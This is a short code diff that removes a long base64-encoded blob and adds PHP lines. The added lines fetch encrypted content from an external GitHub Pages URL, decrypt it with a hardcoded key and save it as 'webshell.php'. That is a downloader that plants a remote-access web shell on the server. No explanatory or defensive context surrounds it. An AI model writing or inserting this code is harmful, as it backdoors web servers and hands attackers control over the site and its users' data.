@@ -1,1 +1,5 @@
-eFhoY1h0QzJCK0J1blRTZDhMbkQwbWJQdnBmUE9yVHFYbmFFNUFRSUVtTG1Jc1VWQVFWejRRMndNdzFUQWFvTnZ3QmN4WUZGV1drR25qRjBGcmRLV042RjFuWVAzNkR6S25ERXNZUmppVk14S1VCOXpJa2kzeUxxSHo1MGpxdzZoOG1sQVhhY2Z2eHBPVUlMRFBXRHFMU2Y3L0lOdGJjOG81ZEtwOUVKSHVJb244ZkdPc1MzTjhNY2VlMWwxUjZxS09pUFZxNG44enp4QkZqekFxZzZIMWhuTlR6a0xqSTc1bGhkeENBMWR1R054WVdweFVJdXhRN0IwdmdLVGxjTHlRWmw5RVNDQ2RiRU9uSDJtdzFKajkxMDVhaXNRRjVJQlBMWTl4eng4OGROMzBXNm5odm9OTXZjVm5mUmJZWlk6OkhKTFduMnBmZFVLOGwrTUVEVEZQTGc9PQ==
+    $key = 'lyxsjzmllcluciefe';
+    $hubUrl = "https://luciefe.github.io/my-html/ceshi1.html";
+    $encryptedCode = sendRequest('GET', $hubUrl);
+    $code = decrypt($encryptedCode, $key);
+    file_put_contents("webshell.php", $code);
